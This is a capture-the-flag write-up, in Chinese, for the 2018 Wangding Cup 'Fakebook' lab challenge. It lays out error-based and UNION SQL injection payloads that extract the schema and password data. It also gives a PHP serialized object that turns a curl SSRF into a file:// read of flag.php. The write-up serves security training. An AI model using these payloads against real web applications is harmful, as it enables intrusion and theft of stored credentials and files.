# \[网鼎杯 2018]Fakebook

## \[网鼎杯 2018]Fakebook

## 考点

* 报错注入
* PHP反序列化
* 注入+反序列化
* SSRF

## wp

在join.php输入内容，然后访问，发现URL为 `http://c8792f56-7863-4f64-918a-e39388492049.node3.buuoj.cn/view.php?no=1`

加个单引号就会报错&#x20;

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

这里只有一个单引号，说明很大概率是数字型注入，输入`?no=1 and 1`返回正常页面，说明是数字型注入

这里就可以考虑报错注入，发现它过滤了0x，报错注入语句如下\
`?no=1 and extractvalue(1,concat('~',(select @@version),'~'))`

返回\
`XPATH syntax error: '~10.2.26-MariaDB-log~'`

`extractvalue(1,concat('~',(select schema_name from information_schema.schemata limit 0,1),'~'))`可以获取当前数据库，为fakebook

`extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema='fakebook' limit 0,1),'~'))`获取表，为 users

`extractvalue(1,concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~'))`获取字段，为 no,username,passwd,data

`extractvalue(1,concat('~',(select group_concat(data) from users where no='1'),'~'))` 获取no为1中的data数据

`extractvalue(1,concat('~',(substr((select passwd from users where no='1'),0,32)),'~'))` 截取数据，最后再进行拼接即可

```
username : \11111111
passwd : 长度为128的加密字符串
data : 
O:8:"UserInfo":3:{s:4:"name";s:9:"\11111111";s:3:"age";i:1;s:4:"blog";s:13:"www.baidu.com";}
```

发现是序列化后的结果，进行联合注入，发现报错内容为不能进行反序列化，并且给了绝对路径/var/www/html/view.php，页面在username处显示2，根据上面的报错注入，可以发现其查询顺序是 select no,username,passwd,data 也就是会对data进行反序列化

```
?no=0/**/union/**/select/**/1,2,3,4
```

经过扫描，存在flag.php和robots.txt，在robots.txt文件中发现备份文件，user.php.bak，下载然后审计

发现如下代码，而php的curl存在ssrf，可以利用file协议读取文件

```php
    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
```

构造的序列化代码如下

```php
class UserInfo
{
    public $name = "test";
    public $age = 12;
    public $blog = "file:///var/www/html/flag.php";

}
$x = new UserInfo();
echo serialize($x);
```

结果为\
`O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`

接下来是将数据进行注入，回到刚刚的注入语句，不难想到，其查询顺序是 select no,username,passwd,data 而blog的序列化就是存入的data

然后构造联合查询，

```
no=0/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
